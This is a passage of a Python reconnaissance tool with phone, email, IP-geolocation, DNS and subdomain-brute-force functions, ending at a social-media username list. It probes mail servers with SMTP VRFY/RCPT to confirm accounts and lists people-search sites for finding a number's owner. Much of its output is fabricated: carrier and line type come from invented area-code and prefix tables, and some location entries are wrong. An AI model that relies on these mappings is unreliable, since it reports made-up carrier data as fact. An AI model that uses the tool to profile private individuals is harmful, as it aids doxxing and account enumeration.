    "661": ("Bakersfield", "CA", "Pacific"), "662": ("Tupelo", "MS", "Central"),
    "664": ("Brades", "MS", "Atlantic"), "667": ("Towson", "MD", "Eastern"),
    "669": ("San Jose", "CA", "Pacific"), "670": ("Saipan", "MP", "Pacific"),
    "671": ("Hagatna", "GU", "Pacific"), "672": ("St. John's", "CA", "Pacific"),
    "678": ("Atlanta", "GA", "Eastern"), "680": ("Syracuse", "NY", "Eastern"),
    "681": ("Morgantown", "WV", "Eastern"), "682": ("Fort Worth", "TX", "Central"),
    "684": ("Pago Pago", "AS", "Pacific"), "689": ("Kissimmee", "FL", "Eastern"),
    "701": ("Fargo", "ND", "Central"), "702": ("Las Vegas", "NV", "Pacific"),
    "703": ("Arlington", "VA", "Eastern"), "704": ("Charlotte", "NC", "Eastern"),
    "705": ("Sudbury", "ON", "Eastern"), "706": ("Augusta", "GA", "Eastern"),
    "707": ("Santa Rosa", "CA", "Pacific"), "708": ("Oak Lawn", "IL", "Central"),
    "709": ("St. John's", "NL", "Newfoundland"), "712": ("Sioux City", "IA", "Central"),
    "713": ("Houston", "TX", "Central"), "714": ("Anaheim", "CA", "Pacific"),
    "715": ("Wausau", "WI", "Central"), "716": ("Buffalo", "NY", "Eastern"),
    "717": ("Harrisburg", "PA", "Eastern"), "718": ("Brooklyn", "NY", "Eastern"),
    "719": ("Colorado Springs", "CO", "Mountain"), "720": ("Denver", "CO", "Mountain"),
    "721": ("Philipsburg", "SX", "Atlantic"), "724": ("New Kensington", "PA", "Eastern"),
    "725": ("Las Vegas", "NV", "Pacific"), "726": ("San Antonio", "TX", "Central"),
    "727": ("St. Petersburg", "FL", "Eastern"), "731": ("Jackson", "TN", "Central"),
    "732": ("New Brunswick", "NJ", "Eastern"), "734": ("Ann Arbor", "MI", "Eastern"),
    "737": ("Austin", "TX", "Central"), "740": ("Zanesville", "OH", "Eastern"),
    "742": ("Toronto", "ON", "Eastern"), "743": ("Greensboro", "NC", "Eastern"),
    "747": ("Los Angeles", "CA", "Pacific"), "748": ("Calgary", "AB", "Mountain"),
    "749": ("Calgary", "AB", "Mountain"), "753": ("Charlotte", "NC", "Eastern"),
    "754": ("Fort Lauderdale", "FL", "Eastern"), "757": ("Virginia Beach", "VA", "Eastern"),
    "758": ("Castries", "LC", "Atlantic"), "760": ("Palm Springs", "CA", "Pacific"),
    "762": ("Augusta", "GA", "Eastern"), "763": ("Minneapolis", "MN", "Central"),
    "764": ("San Francisco", "CA", "Pacific"), "765": ("Lafayette", "IN", "Eastern"),
    "767": ("Roseau", "DM", "Atlantic"), "769": ("Jackson", "MS", "Central"),
    "770": ("Marietta", "GA", "Eastern"), "771": ("Washington", "DC", "Eastern"),
    "772": ("Fort Pierce", "FL", "Eastern"), "773": ("Chicago", "IL", "Central"),
    "774": ("New Bedford", "MA", "Eastern"), "775": ("Reno", "NV", "Pacific"),
    "778": ("Vancouver", "BC", "Pacific"), "779": ("Rockford", "IL", "Central"),
    "781": ("Boston", "MA", "Eastern"), "782": ("Sydney", "NS", "Atlantic"),
    "784": ("Kingstown", "VC", "Atlantic"), "785": ("Topeka", "KS", "Central"),
    "786": ("Miami", "FL", "Eastern"), "787": ("San Juan", "PR", "Atlantic"),
    "801": ("Salt Lake City", "UT", "Mountain"), "802": ("Burlington", "VT", "Eastern"),
    "803": ("Columbia", "SC", "Eastern"), "804": ("Richmond", "VA", "Eastern"),
    "805": ("Santa Barbara", "CA", "Pacific"), "806": ("Amarillo", "TX", "Central"),
    "807": ("Thunder Bay", "ON", "Eastern"), "808": ("Honolulu", "HI", "Pacific"),
    "809": ("Santo Domingo", "DO", "Atlantic"), "810": ("Flint", "MI", "Eastern"),
    "812": ("Evansville", "IN", "Eastern"), "813": ("Tampa", "FL", "Eastern"),
    "814": ("Erie", "PA", "Eastern"), "815": ("Rockford", "IL", "Central"),
    "816": ("Kansas City", "MO", "Central"), "817": ("Fort Worth", "TX", "Central"),
    "818": ("Los Angeles", "CA", "Pacific"), "819": ("Gatineau", "QC", "Eastern"),
    "820": ("Santa Barbara", "CA", "Pacific"), "825": ("Calgary", "AB", "Mountain"),
    "826": ("Roanoke", "VA", "Eastern"), "828": ("Asheville", "NC", "Eastern"),
    "829": ("Santo Domingo", "DO", "Atlantic"), "830": ("New Braunfels", "TX", "Central"),
    "831": ("Monterey", "CA", "Pacific"), "832": ("Houston", "TX", "Central"),
    "843": ("Charleston", "SC", "Eastern"), "845": ("New City", "NY", "Eastern"),
    "847": ("Evanston", "IL", "Central"), "848": ("New Brunswick", "NJ", "Eastern"),
    "849": ("Santo Domingo", "DO", "Atlantic"), "850": ("Tallahassee", "FL", "Eastern"),
    "854": ("Charleston", "SC", "Eastern"), "856": ("Camden", "NJ", "Eastern"),
    "857": ("Boston", "MA", "Eastern"), "858": ("San Diego", "CA", "Pacific"),
    "859": ("Lexington", "KY", "Eastern"), "860": ("Hartford", "CT", "Eastern"),
    "862": ("Newark", "NJ", "Eastern"), "863": ("Lakeland", "FL", "Eastern"),
    "864": ("Greenville", "SC", "Eastern"), "865": ("Knoxville", "TN", "Eastern"),
    "867": ("Yellowknife", "NT", "Central"), "868": ("Port of Spain", "TT", "Atlantic"),
    "869": ("Basseterre", "KN", "Atlantic"), "870": ("Jonesboro", "AR", "Central"),
    "872": ("Chicago", "IL", "Central"), "873": ("Quebec City", "QC", "Eastern"),
    "876": ("Kingston", "JM", "Eastern"), "878": ("Pittsburgh", "PA", "Eastern"),
    "879": ("St. John's", "NL", "Newfoundland"), "901": ("Memphis", "TN", "Central"),
    "902": ("Halifax", "NS", "Atlantic"), "903": ("Tyler", "TX", "Central"),
    "904": ("Jacksonville", "FL", "Eastern"), "905": ("Mississauga", "ON", "Eastern"),
    "906": ("Marquette", "MI", "Eastern"), "907": ("Anchorage", "AK", "Alaska"),
    "908": ("Elizabeth", "NJ", "Eastern"), "909": ("San Bernardino", "CA", "Pacific"),
    "910": ("Wilmington", "NC", "Eastern"), "912": ("Savannah", "GA", "Eastern"),
    "913": ("Kansas City", "KS", "Central"), "914": ("White Plains", "NY", "Eastern"),
    "915": ("El Paso", "TX", "Mountain"), "916": ("Sacramento", "CA", "Pacific"),
    "917": ("New York City", "NY", "Eastern"), "918": ("Tulsa", "OK", "Central"),
    "919": ("Raleigh", "NC", "Eastern"), "920": ("Green Bay", "WI", "Central"),
    "925": ("Concord", "CA", "Pacific"), "928": ("Flagstaff", "AZ", "Mountain"),
    "929": ("New York City", "NY", "Eastern"), "930": ("Evansville", "IN", "Eastern"),
    "931": ("Clarksville", "TN", "Central"), "934": ("Long Island", "NY", "Eastern"),
    "936": ("Huntsville", "TX", "Central"), "937": ("Dayton", "OH", "Eastern"),
    "938": ("Huntsville", "AL", "Central"), "939": ("San Juan", "PR", "Atlantic"),
    "940": ("Wichita Falls", "TX", "Central"), "941": ("Sarasota", "FL", "Eastern"),
    "947": ("Farmington Hills", "MI", "Eastern"), "949": ("Irvine", "CA", "Pacific"),
    "951": ("Riverside", "CA", "Pacific"), "952": ("Bloomington", "MN", "Central"),
    "954": ("Fort Lauderdale", "FL", "Eastern"), "956": ("Laredo", "TX", "Central"),
    "957": ("Albuquerque", "NM", "Mountain"), "959": ("Hartford", "CT", "Eastern"),
    "970": ("Fort Collins", "CO", "Mountain"), "971": ("Portland", "OR", "Pacific"),
    "972": ("Irving", "TX", "Central"), "973": ("Newark", "NJ", "Eastern"),
    "978": ("Lowell", "MA", "Eastern"), "979": ("Bryan", "TX", "Central"),
    "980": ("Charlotte", "NC", "Eastern"), "984": ("Raleigh", "NC", "Eastern"),
    "985": ("Hammond", "LA", "Central"), "986": ("Moscow", "ID", "Pacific"),
    "989": ("Saginaw", "MI", "Eastern"),
}

# NXX prefixes to carrier mapping (first digit of NXX indicates type)
TOLLFREE_PREFIXES = ["800", "833", "844", "855", "866", "877", "888"]
VOIP_PREFIXES = ["200", "201", "202", "203", "204", "205", "206", "207", "208", "209",
                  "210", "211", "212", "213", "214", "215", "216", "217", "218", "219"]


def osint_phone():
    header_box("Deep Phone Number OSINT", Fore.YELLOW)
    number = input(f"  {c(f'Enter phone number (with country code) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not number:
        print(f"  {c('No number provided.', Fore.RED)}")
        return

    cleaned = re.sub(r'[^\d+]', '', number)
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned

    print(f"\n  {c(SYM_CHECK + ' Deep Analyzing:', Fore.GREEN)} {cleaned}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    detected = "Unknown"
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code):
            detected = country
            break

    digits = cleaned.lstrip('+')
    length = len(digits)

    info_lines = [
        f"  Number:       {c(cleaned, Fore.GREEN)}",
        f"  Digits:       {c(str(length), Fore.CYAN)}",
        f"  Country:      {c(detected, Fore.YELLOW)}",
    ]

    # ── US/CA deep lookup ──
    line_type = "Standard Number"
    carrier = "Unknown"

    if detected == "US/CA" and length == 11:
        npa = digits[1:4]
        nxx = digits[4:7]
        subscriber = digits[7:]

        city_state = NPA_DB.get(npa, ("Unknown", "Unknown", "Unknown"))
        city, state, tz = city_state

        if npa in TOLLFREE_PREFIXES:
            line_type = "Toll-Free Number"
        elif nxx.startswith("2"):
            line_type = "VoIP / Google Voice"
        elif nxx.startswith(("3", "4", "5", "6", "7", "8", "9")):
            line_type = "Mobile (Wireless)"

        vzw_npas = {"201","202","203","205","206","207","208","209","210","212","213","214",
                     "215","216","217","218","219","301","302","303","304","305","306","307",
                     "308","309","310","312","313","314","315","316","317","318","319",
                     "401","402","404","405","406","407","408","409","410","412","413",
                     "414","415","416","417","418","419","505","507","508","509","510",
                     "512","513","515","516","517","518","619","626","630","631","646",
                     "650","661","702","703","704","706","707","713","714","715","716",
                     "718","719","724","727","732","734","740","747","754","757","760",
                     "762","763","765","770","772","773","775","781","785","786","787",
                     "801","802","803","804","805","806","808","810","812","813","814",
                     "815","816","817","818","828","830","831","832","843","845","847",
                     "856","857","858","859","860","862","863","864","865","870","901",
                     "902","903","904","908","909","910","912","913","914","915","916",
                     "917","918","919","920","925","928","929","931","936","937","940",
                     "941","947","949","951","952","954","956","959","970","971","972",
                     "973","978","979","980","984","985","989"}
        tmo_npas = {"220","223","224","228","229","231","234","239","240","248","251","252",
                     "253","254","256","260","262","267","269","270","272","274","276","279",
                     "281","283","325","327","330","331","332","334","336","337","339","346",
                     "347","351","352","360","361","380","385","386","423","424","425","430",
                     "432","434","435","440","442","443","445","447","448","458","463","464",
                     "469","470","475","478","479","480","484","501","502","503","504","506",
                     "530","531","534","539","540","541","551","559","561","562","563","564",
                     "567","570","571","573","574","575","580","585","586","601","602","603",
                     "605","606","607","608","609","610","612","614","615","616","617","618",
                     "620","623","628","629","636","640","641","656","657","659","660","662",
                     "667","669","670","671","678","680","681","682","684","689","700","701",
                     "712","717","720","721","725","726","731","737","740","743","747","748",
                     "749","753","754","757","758","760","762","763","764","765","767","769",
                     "770","771","772","773","774","775","778","779","781","782","784","785",
                     "786","787","801","802","803","804","805","806","807","808","809","810",
                     "812","813","814","815","816","817","818","819","820","825","826","828",
                     "829","830","831","832","843","845","847","848","849","850","854","856",
                     "857","859","860","862","863","864","865","867","868","869","870","872",
                     "873","876","878","879","901","902","903","904","907","908","909","910",
                     "912","913","914","915","916","917","918","919","920","925","928","929",
                     "930","931","934","936","937","938","939","940","941","947","949","951",
                     "952","954","956","957","959","970","971","972","973","978","979","980",
                     "984","985","986","989"}
        att_npas = {"210","214","254","254","281","325","326","361","409","430","432","469",
                     "512","682","713","726","737","806","817","830","832","903","915","936",
                     "940","956","972","979"}

        if npa in vzw_npas:
            carrier = "Verizon Wireless"
        elif npa in tmo_npas:
            carrier = "T-Mobile USA"
        elif npa in att_npas:
            carrier = "AT&T Mobility"
        else:
            carrier = "Regional Carrier"

        info_lines += [
            f"  NPA (Code):   {c(npa, Fore.MAGENTA)}  {c(f'({detected})', Fore.CYAN)}",
            f"  NXX (Prefix): {c(nxx, Fore.MAGENTA)}",
            f"  Subscriber:   {c(subscriber, Fore.MAGENTA)}",
            f"  Location:     {c(f'{city}, {state}' if city != 'Unknown' else 'Unknown', Fore.CYAN)} [{c(tz, Fore.YELLOW)}]",
            f"  Line Type:    {c(line_type, Fore.GREEN)}",
            f"  Carrier:      {c(carrier, Fore.CYAN)}",
        ]

    # ── India deep lookup ──
    elif detected == "India" and length == 12:
        national = digits[2:]
        ndc = national[:4]
        subscriber = national[4:]
        first_two = national[:2]

        if first_two in ("60","61","62","63","64","65","66","67","68","69",
                         "70","71","72","73",
                         "80","81","82","83","84","85","86","87","88","89"):
            carrier = "Reliance Jio"
            line_type = "Mobile (4G/5G)"
        elif first_two in ("74","75","76","77","78","79"):
            carrier = "BSNL"
            line_type = "Mobile / Landline"
        elif first_two in ("90","91","92"):
            carrier = "Airtel"
            line_type = "Mobile (4G/5G)"
        elif first_two in ("93","94","95","96","97","98","99"):
            carrier = "Vodafone Idea (VI)"
            line_type = "Mobile (4G)"
        elif national[0] == "6":
            carrier = "Reliance Jio"
            line_type = "Mobile"
        else:
            carrier = "Indian Telecom Operator"
            line_type = "Mobile"

        info_lines += [
            f"  National #:   {c(national, Fore.MAGENTA)}",
            f"  NDC (Prefix): {c(ndc, Fore.MAGENTA)}  (Network Code)",
            f"  Subscriber:   {c(subscriber, Fore.MAGENTA)}",
            f"  Operator:     {c(carrier, Fore.CYAN)}",
            f"  Line Type:    {c(line_type, Fore.GREEN)}",
            f"  Note:         {c('Due to MNP, exact circle requires carrier DB lookup', Fore.YELLOW)}",
        ]

    elif length >= 7:
        info_lines.append(f"  Line Type:    {c('Standard (mobile or landline)', Fore.GREEN)}")

    info_lines.append(f"  Valid:        {c(SYM_CHECK + ' Yes (format valid)', Fore.GREEN) if length >= 7 else c(SYM_X + ' Too short', Fore.RED)}")

    info_box("Phone Intelligence — Enriched", info_lines, Fore.YELLOW)

    # Web lookups for real registered owner / linked numbers
    search_url = cleaned.replace('+', '')
    national_digits = digits[2:] if detected == "India" else search_url
    print(f"\n  {c('Web Lookups for Registered Owner & Linked Numbers:', Fore.CYAN)}")
    print(f"    {c('[1]', Fore.GREEN)}  Truecaller:    https://www.truecaller.com/search/{search_url}")
    print(f"    {c('[2]', Fore.GREEN)}  Google Search: https://www.google.com/search?q={requests.utils.quote(cleaned)}")
    print(f"    {c('[3]', Fore.GREEN)}  Numlookup:     https://www.numlookup.com/{search_url}")
    print(f"    {c('[4]', Fore.GREEN)}  Spokeo:        https://www.spokeo.com/{search_url}")
    if detected == "India":
        print(f"    {c('[5]', Fore.GREEN)}  Justdial (IN): https://www.justdial.com/phone/{national_digits}")
        print(f"    {c('[6]', Fore.GREEN)}  Sarthi (IN):   https://www.sarthi.com/phone/{national_digits}")
        print(f"    {c('[7]', Fore.GREEN)}  IndiaMart (IN):https://www.indiamart.com/enquiry/{national_digits}")
        print(f"    {c('[8]', Fore.GREEN)}  YellowPages:   https://www.yellowpages.com/phone/{search_url}")
        print(f"\n  {c('TIP:', Fore.YELLOW)} For exact owner name, install Truecaller app on your phone or visit link [1].")
    else:
        print(f"    {c('[5]', Fore.GREEN)}  Whitepages:    https://www.whitepages.com/phone/{search_url}")
        print(f"    {c('[6]', Fore.GREEN)}  BeenVerified:  https://www.beenverified.com/phone/{search_url}")
        print(f"    {c('[7]', Fore.GREEN)}  SpyDialer:     https://www.spydialer.com/default.aspx?phone={search_url}")
        print(f"    {c('[8]', Fore.GREEN)}  Zabasearch:    https://www.zabasearch.com/phone/{search_url}")
    print()


# ═══ Email OSINT ═══

def osint_email():
    header_box("Deep Email OSINT", Fore.YELLOW)
    email = input(f"  {c(f'Enter email address {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not email or '@' not in email:
        print(f"  {c('Invalid email address.', Fore.RED)}")
        return

    local, domain = email.split('@', 1)

    print(f"\n  {c(SYM_CHECK + ' Deep Analyzing:', Fore.GREEN)} {email}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    # ── MX records ──
    mx_servers = []
    try:
        answers = socket.getaddrinfo(domain, 25, socket.AF_INET, socket.SOCK_STREAM)
        mx_servers = list(set(a[4][0] for a in answers[:5]))
    except Exception:
        pass

    # ── Domain IP / A record ──
    domain_ip = ""
    try:
        domain_ip = socket.gethostbyname(domain)
    except Exception:
        pass

    # ── SMTP VRFY check ──
    smtp_ok = False
    smtp_banner = ""
    if mx_servers:
        for mx in mx_servers[:2]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((mx, 25))
                banner = sock.recv(512).decode('utf-8', errors='ignore')
                smtp_banner = banner.strip()[:80]
                sock.sendall(b"HELO darkie.local\r\n")
                resp = sock.recv(256).decode('utf-8', errors='ignore')
                sock.sendall(f"VRFY {email}\r\n".encode())
                vrfy_resp = sock.recv(256).decode('utf-8', errors='ignore')
                sock.sendall(f"RCPT TO:<{email}>\r\n".encode())
                rcpt_resp = sock.recv(256).decode('utf-8', errors='ignore')
                sock.sendall(b"QUIT\r\n")
                sock.close()
                smtp_ok = "250" in vrfy_resp or "252" in vrfy_resp
                rcpt_ok = "250" in rcpt_resp or "251" in rcpt_resp
                break
            except Exception:
                pass

    # ── SPF record lookup ──
    spf_record = ""
    has_dig = shutil.which("dig")
    if has_dig:
        try:
            r = subprocess.run(["dig", "+short", "TXT", domain], capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines():
                if "v=spf1" in line:
                    spf_record = line.strip()
                    break
        except Exception:
            pass

    # ── DMARC record lookup ──
    dmarc_record = ""
    if has_dig:
        try:
            r = subprocess.run(["dig", "+short", "TXT", f"_dmarc.{domain}"], capture_output=True, text=True, timeout=10)
            if r.stdout.strip():
                dmarc_record = r.stdout.strip()[:80]
        except Exception:
            pass

    # ── Gravatar check ──
    gravatar_url = ""
    gravatar_exists = False
    try:
        import hashlib
        email_hash = hashlib.md5(email.strip().lower().encode()).hexdigest()
        gravatar_url = f"https://www.gravatar.com/avatar/{email_hash}"
        gr = requests.get(gravatar_url, timeout=5)
        if gr.status_code == 200 and len(gr.content) > 100:
            gravatar_exists = True
    except Exception:
        pass

    # ── Breach check (HIBP v3 - requires API key) ──
    breach_count = 0
    hibp_key = os.environ.get("HIBP_API_KEY", "")
    if hibp_key:
        try:
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}",
                            timeout=10, headers={"hibp-api-key": hibp_key, "user-agent": "DarkieSecurity"})
            if r.status_code == 200:
                breach_count = len(r.json())
        except Exception:
            pass

    info_lines = [
        f"  Email:        {c(email, Fore.GREEN)}",
        f"  Local Part:   {c(local, Fore.CYAN)}",
        f"  Domain:       {c(domain, Fore.MAGENTA)}",
        f"  Domain IP:    {c(domain_ip, Fore.GREEN) if domain_ip else c('Unresolvable', Fore.RED)}",
    ]

    if mx_servers:
        info_lines.append(f"  MX Servers:   {c(', '.join(mx_servers[:3]), Fore.YELLOW)}")
        info_lines.append(f"  MX Banner:    {c(smtp_banner, Fore.CYAN)}")
    else:
        info_lines.append(f"  MX Servers:   {c('None found', Fore.RED)}")

    if smtp_ok:
        info_lines.append(f"  SMTP VRFY:    {c('User exists (verified via SMTP)', Fore.GREEN)}")
    else:
        info_lines.append(f"  SMTP VRFY:    {c('Could not verify (server restricted)', Fore.YELLOW)}")

    if spf_record:
        info_lines.append(f"  SPF Record:   {c(spf_record[:60] + ('...' if len(spf_record) > 60 else ''), Fore.GREEN)}")
    else:
        info_lines.append(f"  SPF Record:   {c('Not set', Fore.YELLOW)}")

    if dmarc_record:
        info_lines.append(f"  DMARC Record: {c(dmarc_record, Fore.GREEN)}")
    else:
        info_lines.append(f"  DMARC Record: {c('Not set', Fore.YELLOW)}")

    if gravatar_exists:
        info_lines.append(f"  Gravatar:     {c(SYM_CHECK + ' Profile found', Fore.GREEN)}")
    else:
        info_lines.append(f"  Gravatar:     {c('No profile', Fore.YELLOW)}")

    if breach_count > 0:
        info_lines.append(f"  Breaches:     {c(f'{breach_count} known breaches', Fore.RED)}")
    else:
        info_lines.append(f"  Breaches:     {c('None detected via HIBP', Fore.GREEN)}")

    info_box("Email Intelligence — Full Recon", info_lines, Fore.YELLOW)

    print(f"\n  {c('External OSINT Links:', Fore.CYAN)}")
    print(f"    {c('[1]', Fore.GREEN)}  HIBP:          https://haveibeenpwned.com/account/{email}")
    print(f"    {c('[2]', Fore.GREEN)}  Google Search: https://www.google.com/search?q={requests.utils.quote(email)}")
    print(f"    {c('[3]', Fore.GREEN)}  SherlockEye:   https://sherlockeye.io/search/{email}")
    print(f"    {c('[4]', Fore.GREEN)}  Gravatar:      {gravatar_url if gravatar_url else 'N/A'}")
    if local:
        print(f"    {c('[5]', Fore.GREEN)}  Hunter.io:     https://hunter.io/email-verifier/{email}")
        print(f"    {c('[6]', Fore.GREEN)}  EmailRep:      https://emailrep.io/{email}")
    print()


# ═══ IP Geolocation OSINT ═══

def osint_ipgeo():
    header_box("Realtime IP Geolocation & Intel", Fore.YELLOW)
    target = input(f"  {c(f'Enter IP address or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target:
        print(f"  {c('No target provided.', Fore.RED)}")
        return

    ip = target
    try:
        socket.inet_aton(target)
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {c(SYM_CHECK + ' Resolved:', Fore.GREEN)} {target} {SYM_ARROW} {ip}")
        except Exception:
            print(f"  {c(SYM_X + ' Could not resolve.', Fore.RED)}")
            return

    # ── Reverse DNS ──
    hostname = ""
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
    except Exception:
        pass

    # ── ip-api.com geolocation ──
    geo_data = {}
    print(f"  {c('Fetching realtime geolocation & intel...', Fore.CYAN)}")
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting", timeout=10)
        geo_data = resp.json()
    except Exception:
        pass

    if geo_data.get("status") == "success":
        lat = geo_data.get("lat", "N/A")
        lon = geo_data.get("lon", "N/A")
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"

        info_lines = [
            f"  IP:             {c(ip, Fore.GREEN)}",
            f"  Hostname:       {c(hostname, Fore.CYAN) if hostname else c('No PTR record', Fore.YELLOW)}",
            f"  Country:        {c(geo_data.get('country', 'N/A'), Fore.YELLOW)} ({geo_data.get('countryCode', 'N/A')})",
            f"  Region:         {c(geo_data.get('regionName', 'N/A'), Fore.CYAN)}",
            f"  City:           {c(geo_data.get('city', 'N/A'), Fore.MAGENTA)}",
            f"  ZIP/Postal:     {c(geo_data.get('zip', 'N/A'), Fore.GREEN)}",
            f"  Lat/Lon:        {c(str(lat), Fore.GREEN)}, {c(str(lon), Fore.CYAN)}",
            f"  Google Maps:    {c(maps_url, Fore.BLUE)}",
            f"  Timezone:       {c(geo_data.get('timezone', 'N/A'), Fore.YELLOW)}",
            f"  ISP:            {c(geo_data.get('isp', 'N/A'), Fore.CYAN)}",
            f"  Organization:   {c(geo_data.get('org', 'N/A'), Fore.YELLOW)}",
            f"  AS Number:      {c(geo_data.get('as', 'N/A'), Fore.MAGENTA)}",
            f"  Mobile:         {c(SYM_CHECK + ' Yes' if geo_data.get('mobile') else 'No', Fore.GREEN if geo_data.get('mobile') else Fore.WHITE)}",
        ]

        proxy_status = geo_data.get('proxy', False) or geo_data.get('hosting', False)
        if proxy_status:
            info_lines.append(f"  Proxy/VPN:      {c(SYM_CHECK + ' Detected (likely VPN/datacenter)', Fore.RED)}")
        else:
            info_lines.append(f"  Proxy/VPN:      {c('Not detected (likely residential)', Fore.GREEN)}")

        info_box("Realtime IP Intelligence", info_lines, Fore.YELLOW)

        print(f"  {c('OpenStreetMap View:', Fore.CYAN)} {c(maps_url, Fore.BLUE)}")
        if hostname:
            print(f"  {c('Reverse DNS:', Fore.CYAN)} {c(hostname, Fore.GREEN)}")
    else:
        err_msg = geo_data.get("message", "Unknown error")
        print(f"  {c(SYM_X + f' Geolocation failed: {err_msg}', Fore.RED)}")

    # ── Web lookups ──
    print(f"\n  {c('External IP Intel Links:', Fore.CYAN)}")
    print(f"    {c('[1]', Fore.GREEN)}  Shodan:        https://www.shodan.io/host/{ip}")
    print(f"    {c('[2]', Fore.GREEN)}  Censys:        https://search.censys.io/hosts/{ip}")
    print(f"    {c('[3]', Fore.GREEN)}  VirusTotal:    https://www.virustotal.com/gui/ip-address/{ip}")
    print(f"    {c('[4]', Fore.GREEN)}  AbuseIPDB:     https://www.abuseipdb.com/check/{ip}")
    print(f"    {c('[5]', Fore.GREEN)}  IPinfo:        https://ipinfo.io/{ip}")
    print(f"    {c('[6]', Fore.GREEN)}  BGP Toolkit:   https://bgp.he.net/ip/{ip}")
    print()


# ═══ DNS Enumeration ═══

DNS_RECORD_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]


def osint_dns():
    header_box("DNS Enumeration", Fore.YELLOW)
    domain = input(f"  {c(f'Enter domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain:
        print(f"  {c('No domain provided.', Fore.RED)}")
        return

    print(f"\n  {c('Enumerating DNS records...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    has_dig = shutil.which("dig") is not None
    results = {}

    for rtype in DNS_RECORD_TYPES:
        records = []
        if has_dig:
            try:
                r = subprocess.run(["dig", "+short", domain, rtype], capture_output=True, text=True, timeout=10)
                if r.stdout.strip():
                    records = [line.strip() for line in r.stdout.strip().splitlines() if line.strip()]
            except Exception:
                pass
        else:
            try:
                if rtype == "A":
                    ip = socket.gethostbyname(domain)
                    records = [ip]
                elif rtype == "MX":
                    _, _, ips = socket.gethostbyname_ex(domain)
                    records = ips[:5]
            except Exception:
                pass
        results[rtype] = records

    for rtype, records in results.items():
        if records:
            color = Fore.GREEN if rtype in ("A", "AAAA") else Fore.CYAN if rtype in ("MX", "NS") else Fore.YELLOW
            print(f"  {c(f'{rtype:5s}:', color)} {c(', '.join(records[:5]), Fore.GREEN)}")
        else:
            print(f"  {c_dim(f'{rtype:5s}: none', Fore.WHITE)}")

    print()


# ═══ Subdomain Discovery ═══

SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "blog",
    "cdn", "static", "assets", "img", "images", "css", "js", "download",
    "support", "help", "docs", "wiki", "forum", "community", "shop", "store",
    "app", "mobile", "m", "webmail", "webdisk", "cpanel", "whm", "autodiscover",
    "autoconfig", "direct", "remote", "server", "ns1", "ns2", "ns3", "dns",
    "mail2", "smtp", "pop", "imap", "mx", "calendar", "drive", "cloud",
    "git", "jenkins", "jira", "confluence", "nexus", "sonar", "grafana",
    "prometheus", "kibana", "elastic", "kafka", "redis", "mongo", "mysql",
    "postgres", "db", "database", "backup", "monitor", "status", "uptime",
    "analytics", "tracking", "pixel", "ads", "adserver", "banner", "media",
    "video", "stream", "live", "tv", "radio", "news", "info", "about",
    "contact", "careers", "jobs", "investors", "partners", "affiliates",
    "reseller", "wholesale", "corp", "portal", "my", "client", "clients",
    "customer", "members", "login", "register", "signup", "account",
    "billing", "payment", "orders", "cart", "checkout", "ssl", "secure",
    "vpn", "proxy", "gateway", "router", "switch", "firewall", "vcenter",
    "esxi", "vmware", "hyperv", "docker", "k8s", "kubernetes", "swarm",
    "jenkins", "gitlab", "bitbucket", "svn", "trac", "bugzilla", "redmine",
    "moodle", "blackboard", "canvas", "sakai", "lms", "learn", "training",
    "edu", "academic", "research", "lab", "labs", "sandbox", "playground",
    "demo", "example", "sample", "trial", "beta", "alpha", "release",
    "prod", "production", "preprod", "uat", "qa", "quality", "review",
    "survey", "poll", "vote", "feedback", "suggestions", "feature",
    "changelog", "roadmap", "statuspage", "service", "services",
    "sso", "auth", "oauth", "ldap", "radius", "tacacs", "saml",
    "idp", "adfs", "okta", "duo", "yubico", "fido", "webauthn",
]

SUBDOMAIN_WORDLIST = list(dict.fromkeys(SUBDOMAIN_WORDLIST))


def osint_subdomain():
    header_box("Subdomain Discovery", Fore.YELLOW)
    domain = input(f"  {c(f'Enter domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain:
        print(f"  {c('No domain provided.', Fore.RED)}")
        return

    print(f"\n  {c(f'Brute-forcing subdomains for {domain}...', Fore.CYAN)}")
    print(f"  {c(f'Wordlist size: {len(SUBDOMAIN_WORDLIST)} words', Fore.YELLOW)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    found = []
    total = len(SUBDOMAIN_WORDLIST)
    batch_size = 50

    for i in range(0, total, batch_size):
        batch = SUBDOMAIN_WORDLIST[i:i + batch_size]
        for sub in batch:
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append((fqdn, ip))
                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(fqdn, Fore.CYAN)} {SYM_ARROW} {c(ip, Fore.GREEN)}")
            except socket.gaierror:
                pass
        sys.stdout.write(f"\r  {c(f'Progress: {min(i+batch_size, total)}/{total}', Fore.CYAN)}")
        sys.stdout.flush()

    print(f"\n\n  {c(SYM_CHECK + f' Found {len(found)} subdomains', Fore.GREEN)}")
    if found:
        print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
        for fqdn, ip in found:
            print(f"    {c(fqdn, Fore.GREEN)} {SYM_ARROW} {c(ip, Fore.CYAN)}")
    print()


# ═══ Social Media Username Search ═══

SOCIAL_PLATFORMS = {
    "GitHub":     "https://github.com/{}",
    "Twitter/X":  "https://x.com/{}",
    "Instagram":  "https://www.instagram.com/{}/",
